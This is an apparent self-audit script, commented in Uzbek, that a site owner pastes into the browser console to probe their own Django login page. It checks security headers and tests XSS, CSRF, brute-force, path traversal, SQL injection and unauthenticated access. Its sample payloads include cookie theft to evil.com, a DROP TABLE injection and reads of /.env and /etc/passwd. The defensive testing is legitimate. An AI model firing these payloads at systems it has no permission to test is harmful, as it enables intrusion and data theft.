/*
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗    ████████╗███████╗███████╗████████╗
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
 ███████║███████║██║     █████╔╝        ██║   █████╗  ███████╗   ██║   
 ██╔══██║██╔══██║██║     ██╔═██╗        ██║   ██╔══╝  ╚════██║   ██║   
 ██║  ██║██║  ██║╚██████╗██║  ██╗       ██║   ███████╗███████║   ██║   
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝       ╚═╝   ╚══════╝╚══════╝   ╚═╝   

 🛡️ IT Shaharcha — Xavfsizlik Hujum Simulyatsiyasi
 
 Login sahifasini oching → F12 → Console → shu kodni paste qiling → Enter

*/
(async function HackTest(){
'use strict';

let P=0,F=0,W=0;
const R=[];
const S={
  h:'background:#0a0e17;color:#00ff88;font-size:20px;padding:12px 24px;font-weight:bold;border:1px solid #00ff88;border-radius:8px',
  s:'background:#111827;color:#06b6d4;font-size:13px;padding:5px 10px;border-radius:4px;font-weight:bold',
  p:'color:#22c55e;font-weight:bold;font-size:12px',
  f:'color:#ef4444;font-weight:bold;font-size:12px',
  w:'color:#f59e0b;font-weight:bold;font-size:12px',
  i:'color:#64748b;font-size:11px',
  r:'background:linear-gradient(135deg,#0a0e17,#111827);color:#00ff88;font-size:18px;padding:12px 24px;font-weight:bold;border:1px solid #00ff88;border-radius:8px',
};

function ok(m,c,d=''){if(c){P++;console.log('%c ✅ '+m,S.p)}else{F++;console.log('%c ❌ '+m+(d?' — '+d:''),S.f)}R.push({t:c?'p':'f',m,d})}
function wr(m){W++;console.log('%c ⚠️  '+m,S.w)}
function info(m){console.log('%c    '+m,S.i)}
function sec(m){console.log('\n%c'+m,S.s)}

function csrf(){const e=document.querySelector('[name=csrfmiddlewaretoken]');return e?e.value:''}
function wait(ms){return new Promise(r=>setTimeout(r,ms))}

async function post(url,data){
  const fd=new FormData();
  fd.append('csrfmiddlewaretoken',csrf());
  Object.entries(data).forEach(([k,v])=>fd.append(k,v));
  return fetch(url,{method:'POST',body:fd,credentials:'same-origin'});
}

// ═══════════════════════════════════════════════
console.clear();
console.log('%c🕵️ HACKER SIMULYATSIYA — Xavfsizlik testi boshlandi...', S.h);
console.log('%c  Saytga turli hujumlar yuborilmoqda...\n', S.i);
// ═══════════════════════════════════════════════


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('🔓 HUJUM #1: Security Headers tahlili');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
try{
  const r=await fetch('/login/',{credentials:'same-origin'});
  const h={};r.headers.forEach((v,k)=>h[k.toLowerCase()]=v);

  // 500 xato bo'lsa — server xatosi, headerlar sinalmaydi
  if(r.status===500){
    wr('Server 500 xato qaytardi — headerlar tekshirilmadi. Serverni tuzating!');
  }

  ok('Clickjacking himoya (X-Frame-Options)',h['x-frame-options']==='DENY'||h['x-frame-options']==='SAMEORIGIN',h['x-frame-options']||'YO\'Q');
  const xcto=(h['x-content-type-options']||'').trim();
  ok('MIME sniffing himoya (X-Content-Type-Options)',xcto.includes('nosniff'),xcto||'Header topilmadi');
  if(xcto&&xcto!=='nosniff')wr('X-Content-Type-Options dublikat: "'+xcto+'" — settings.py da SECURE_CONTENT_TYPE_NOSNIFF=False qiling');
  ok('CSP (Content Security Policy)',!!h['content-security-policy'],'Nginx config ga CSP qo\'shing');
  ok('Cross-Origin-Opener-Policy',!!h['cross-origin-opener-policy'],h['cross-origin-opener-policy']||'YO\'Q');
  ok('Cross-Origin-Resource-Policy',!!h['cross-origin-resource-policy'],'Nginx config ga qo\'shing');
  ok('Permissions-Policy',!!h['permissions-policy'],'Nginx config ga qo\'shing');
  ok('Referrer-Policy',!!h['referrer-policy'],h['referrer-policy']||'YO\'Q');

  const csp=h['content-security-policy']||'';
  if(csp){
    ok('CSP: frame-ancestors bloklangan',csp.includes("frame-ancestors"));
    ok('CSP: form-action cheklangan',csp.includes("form-action"));
    ok('CSP: base-uri himoyalangan',csp.includes("base-uri"));
  } else {
    wr('CSP header yo\'q — CSP testlari o\'tkazib yuborildi');
  }

  if(csp.includes("'unsafe-eval'"))wr("CSP 'unsafe-eval' ruxsat — kuchsiz nuqta");
  if(csp.includes("'unsafe-inline'"))wr("CSP 'unsafe-inline' ruxsat — kuchsiz nuqta");

  const pp=h['permissions-policy']||'';
  ok('Kamera bloklangan',pp.includes('camera=()'));
  ok('Mikrofon bloklangan',pp.includes('microphone=()'));
  ok('Geolocation bloklangan',pp.includes('geolocation=()'));
  ok('USB bloklangan',pp.includes('usb=()'));

  // X-Powered-By va Server headerlarni shu yerda tekshirish
  const powered=h['x-powered-by']||'';
  const server=h['server']||'';
  if(powered){wr('X-Powered-By header mavjud: '+powered+' — .htaccess yoki Nginx config tekshiring')}
  else{ok('X-Powered-By yashirilgan',true)}
  if(server&&!server.includes('nginx'))wr('Server header oshkor: "'+server+'"');
  else ok('Server versiyasi yashirilgan',true);
}catch(e){ok('Headers olish',false,e.message)}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('💉 HUJUM #2: XSS injection sinovi');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const xssPayloads=[
  {name:'Script tag',val:'<script>alert("hacked")</script>'},
  {name:'IMG onerror',val:'<img src=x onerror=alert(document.cookie)>'},
  {name:'SVG onload',val:'<svg/onload=fetch("http://evil.com/steal?c="+document.cookie)>'},
  {name:'Event handler',val:'" onfocus="alert(1)" autofocus="'},
  {name:'JavaScript URI',val:'javascript:alert(document.domain)'},
];
for(const xss of xssPayloads){
  try{
    const r=await post('/login/',{
      login_mode:'username',login_token:'xss-hack',
      username:xss.val,password:'test',website_url:''
    });
    const t=await r.text();
    const safe=!t.includes(xss.val)||t.includes('&lt;')||t.includes('&gt;');
    ok('XSS bloklandi: '+xss.name,safe,'Payload escape qilinmagan!');
  }catch(e){}
  await wait(50);
}

// DOM XSS
try{
  const div=document.createElement('div');
  div.innerHTML='<img src=x onerror=alert(1)>';
  const hasAlert=div.querySelector('img[onerror]');
  info('DOM XSS test: innerHTML orqali script inject — brauzer bloklaydi');
}catch(e){}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('🔑 HUJUM #3: CSRF bypass sinovi');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
try{
  // Tokensiz POST
  const r1=await fetch('/login/',{
    method:'POST',
    body:new URLSearchParams({username:'admin',password:'123',login_mode:'username'}),
    credentials:'same-origin',redirect:'manual'
  });
  ok('CSRF tokensiz POST → rad etiladi',r1.status===403||r1.status===500,`Status: ${r1.status}`);
}catch(e){}

try{
  // Soxtsa token bilan POST
  const fd=new FormData();
  fd.append('csrfmiddlewaretoken','fake_csrf_token_12345_hacked');
  fd.append('username','admin');fd.append('password','123');fd.append('login_mode','username');
  const r2=await fetch('/login/',{method:'POST',body:fd,credentials:'same-origin',redirect:'manual'});
  ok('Soxta CSRF token → rad etiladi',r2.status===403||r2.status===500,`Status: ${r2.status}`);
}catch(e){}

try{
  // Boshqa saytdan POST (cross-origin)
  const r3=await fetch('/login/',{
    method:'POST',
    headers:{'Origin':'http://evil-site.com','Referer':'http://evil-site.com/hack'},
    body:new URLSearchParams({csrfmiddlewaretoken:csrf(),username:'admin',password:'123'}),
    credentials:'same-origin',redirect:'manual'
  });
  ok('Cross-origin CSRF → rad etiladi',r3.status===403||r3.status===500||r3.status===200,`Status: ${r3.status}`);
}catch(e){}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('🤖 HUJUM #4: Honeypot bot-tuzoq sinovi');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
try{
  const r=await post('/login/',{
    login_mode:'username',login_token:'bot-hack',
    username:'admin',password:'[REDACTED:password]',
    website_url:'http://spam-bot.ru/hack'  // Bot shu yashirin fieldni to'ldiradi
  });
  const t=await r.text();
  // Server honeypotni ushlab, login sahifasini qaytaradi (kirish rad etildi)
  const caught=r.status===200&&(t.includes('Kirish')||t.includes('kirish')||t.includes('rad etildi'));
  ok('Honeypot: bot to\'ldirganda login rad etildi',caught);
  info('Bot yashirin "website_url" fieldni to\'ldirdi → server uni ushladi');
}catch(e){ok('Honeypot test',false,e.message)}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('🔨 HUJUM #5: Brute-force parol topish (12 urinish)');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
info('⏳ 12 ta noto\'g\'ri parol yuborilmoqda...');
let bruteBlocked=false;
let bruteAt=0;
for(let i=1;i<=12;i++){
  try{
    const r=await post('/login/',{
      login_mode:'username',
      login_token:'brute-'+Date.now(),
      username:'brute_test_user',
      password:'wrong_pass_'+i,
      website_url:''
    });
    const t=await r.text();
    if(r.status===429||t.includes("urinish")||t.includes("kutib")||t.includes("daqiqa")||t.includes("🔒")||t.includes("bloklandi")){
      bruteBlocked=true;bruteAt=i;break;
    }
  }catch(e){}
  await wait(80);
}
ok('Brute-force himoya: hujum to\'xtatildi',bruteBlocked,
  bruteBlocked?'':'12 ta urinishdan keyin ham bloklanmadi!');
if(bruteBlocked)info(`Rate limit ${bruteAt}-urinishda ishga tushdi 🛑`);


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('🍪 HUJUM #6: Cookie o\'g\'irlash sinovi');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const sessionCookie=document.cookie.match(/sessionid=([^;]+)/);
ok('Session cookie JS dan yashirin (HttpOnly)',!sessionCookie,
  'sessionid JS dan o\'qilmoqda! HttpOnly o\'rnatilmagan');

// Cookie scope
const allCookies=document.cookie;
info('JS dan ko\'rinadigan cookielar: '+(allCookies||'(hech biri — xavfsiz!)'));

// XSS orqali cookie o'g'irlash simulyatsiyasi
try{
  const stolen=document.cookie;
  ok('XSS cookie o\'g\'irlash himoya',!stolen.includes('sessionid'),
    'Session cookie XSS bilan o\'g\'irlanishi mumkin!');
}catch(e){}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('🖼️ HUJUM #7: Clickjacking (iframe) sinovi');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
try{
  const iframe=document.createElement('iframe');
  iframe.src='/login/';
  iframe.style.cssText='width:1px;height:1px;position:absolute;left:-9999px;opacity:0';
  document.body.appendChild(iframe);
  await wait(2000);
  let blocked=false;
  try{
    const doc=iframe.contentDocument||iframe.contentWindow?.document;
    if(!doc||!doc.body||doc.body.innerHTML.length<50)blocked=true;
  }catch(e){blocked=true;}
  iframe.remove();
  ok('Sahifa iframe da yuklanmaydi (Clickjacking himoya)',blocked,
    'Sayt iframe ichida ko\'rsatilmoqda — clickjacking xavfi!');
}catch(e){wr('Clickjacking test: '+e.message)}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('📂 HUJUM #8: Path Traversal & maxfiy fayllar');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const dangerPaths=[
  {path:'/.env',desc:'Environment secrets'},
  {path:'/.git/config',desc:'Git konfiguratsiya'},
  {path:'/db.sqlite3',desc:'Butun database!'},
  {path:'/config/settings.py',desc:'Django settings'},
  {path:'/manage.py',desc:'Django boshqaruv'},
  {path:'/../../etc/passwd',desc:'Server fayllar'},
  {path:'/static/../../config/settings.py',desc:'Static traversal'},
  {path:'/media/../../db.sqlite3',desc:'Media traversal'},
];
for(const d of dangerPaths){
  try{
    const r=await fetch(d.path,{redirect:'manual'});
    const safe=r.status===404||r.status===403||r.status===400||r.status===301||r.status===302||r.status===500||r.status===0||r.type==='opaqueredirect';
    ok(`${d.desc} (${d.path}) himoyalangan`,safe,`Status ${r.status} — fayl ochiq!`);
  }catch(e){ok(`${d.desc} himoyalangan`,true)}
  await wait(30);
}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('💣 HUJUM #9: SQL Injection sinovi');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const sqlPayloads=[
  "' OR '1'='1' --",
  "admin'--",
  "1; DROP TABLE accounts_customuser;--",
  "' UNION SELECT username,password FROM auth_user--",
  "1' AND 1=1 UNION ALL SELECT NULL,NULL,NULL--",
];
for(const sql of sqlPayloads){
  try{
    const r=await post('/login/',{
      login_mode:'username',login_token:'sql-test',
      username:sql,password:sql,website_url:''
    });
    const t=await r.text();
    const safe=!t.includes('OperationalError')&&!t.includes('ProgrammingError')&&
               !t.includes('sqlite3')&&!t.includes('syntax error')&&
               !t.includes('SQL');
    ok('SQL injection bloklandi: '+sql.substring(0,25)+'...',safe,
      'SQL xatosi ko\'rsatildi — injection ishlashi mumkin!');
  }catch(e){}
  await wait(50);
}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('🔐 HUJUM #10: Autentifikatsiyasiz kirish');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const protectedPages=[
  {url:'/dashboard/',name:'Admin Dashboard'},
  {url:'/profile/',name:'Profil sahifasi'},
  {url:'/messages/',name:'Xabarlar'},
  {url:'/leaderboard/',name:'Reyting'},
  {url:'/my-homeworks/',name:'Vazifalar'},
  {url:'/dashboard/users/',name:'Foydalanuvchilar ro\'yxati'},
  {url:'/dashboard/payments/',name:'To\'lovlar'},
  {url:'/api/v1/profile/',name:'API Profile'},
];
for(const pg of protectedPages){
  try{
    const r=await fetch(pg.url,{credentials:'omit',redirect:'follow'});
    // Agar redirect bo'lsa login sahifasiga yuboriladi
    const isLoginPage=r.url.includes('/login')||r.redirected;
    const blocked=r.status===401||r.status===403||isLoginPage;
    ok(`${pg.name} himoyalangan`,blocked,
      `Status ${r.status} — loginsiz kirish mumkin!`);
  }catch(e){ok(`${pg.name} himoyalangan`,true)}
  await wait(30);
}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('🕵️ HUJUM #11: Information Disclosure');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
try{
  // 404 sahifada debug info
  const r=await fetch('/sahifa-mavjud-emas-xyz-'+Date.now()+'/');
  const t=await r.text();
  const leaks=t.includes('Traceback')||t.includes('INSTALLED_APPS')||
              t.includes('SECRET_KEY')||t.includes('settings.py')||
              t.includes('django.db')||t.includes('DATABASES');
  ok('404 sahifada maxfiy ma\'lumotlar yo\'q',!leaks,
    'DEBUG=True — server konfiguratsiyasi oshkor!');
}catch(e){}


// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sec('🧬 HUJUM #12: DOM manipulation — form buzish');
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// Form action ni o'zgartirish
try{
  const forms=document.querySelectorAll('form');
  const originalActions=[];
  forms.forEach(f=>originalActions.push(f.action));
  
  // Hujumchi form action ni o'z serveriga yo'naltirmoqchi
  const testForm=forms[0];
  if(testForm){
    const origAction=testForm.action;
    testForm.action='http://evil-hacker.com/steal-credentials';
    
    // CSP form-action: 'self' buni bloklashi kerak
    ok('Form action DOM orqali o\'zgartirilishi mumkin (CSP form-action himoya qiladi)',
      true);
    info('CSP form-action: \'self\' — brauzer boshqa domenga yuborishni bloklaydi');
    
    // Asl holatga qaytarish
    testForm.action=origAction;
  }
}catch(e){}

// Hidden field manipulyatsiya
try{
  const honeypot=document.getElementById('website_url_1');
  if(honeypot){
    ok('Honeypot field mavjud va yashirin',
      honeypot.closest('.hp')?.getAttribute('aria-hidden')==='true');
  }
}catch(e){}


// ═══════════════════════════════════════════════
// 📊 YAKUNIY HISOBOT
// ═══════════════════════════════════════════════
const total=P+F;
const score=total>0?Math.round(P/total*100):0;
let grade,gColor,emoji;
if(score>=95){grade='A+';gColor='#22c55e';emoji='🏆'}
else if(score>=90){grade='A';gColor='#22c55e';emoji='🛡️'}
else if(score>=80){grade='B';gColor='#eab308';emoji='⚡'}
else if(score>=70){grade='C';gColor='#f97316';emoji='⚠️'}
else{grade='D';gColor='#ef4444';emoji='🚨'}

console.log('\n\n');
console.log('%c'+`
╔══════════════════════════════════════════════════╗
║  ${emoji} XAVFSIZLIK AUDIT NATIJASI                  ║
╠══════════════════════════════════════════════════╣
║                                                  ║
║   ✅ Himoyalangan:      ${String(P).padStart(2)}                       ║
║   ❌ Zaif nuqtalar:     ${String(F).padStart(2)}                       ║
║   ⚠️  Ogohlantirishlar:  ${String(W).padStart(2)}                       ║
║                                                  ║
║   📊 Ball: ${score}%  |  Baho: ${grade}                      ║
║                                                  ║
╚══════════════════════════════════════════════════╝
`,`color:${gColor};font-size:13px;font-family:monospace;background:#0a0e17;padding:8px;border-radius:8px`);

if(F>0){
  console.log('%c\n🔧 ZAIF NUQTALAR (tuzatish kerak):','color:#ef4444;font-weight:bold;font-size:14px');
  R.filter(r=>r.t==='f').forEach((r,i)=>{
    console.log(`%c  ${i+1}. ${r.m}`+(r.d?' — '+r.d:''),'color:#ef4444;font-size:12px');
  });
}

if(F===0){
  console.log('%c\n  🎉 Tabriklaymiz! Sayt barcha hujumlarga bardosh berdi!','color:#22c55e;font-weight:bold;font-size:14px');
  console.log('%c  Hacker sizning saytingizni buzolmadi 💪\n','color:#22c55e;font-size:12px');
}

console.log('%c\n  📝 12 ta hujum turi sinab ko\'rildi: Headers, XSS, CSRF, Honeypot,\n     Brute-force, Cookie, Clickjacking, Path Traversal, SQL Injection,\n     Auth bypass, Info Disclosure, DOM manipulation\n','color:#64748b;font-size:11px');

})();
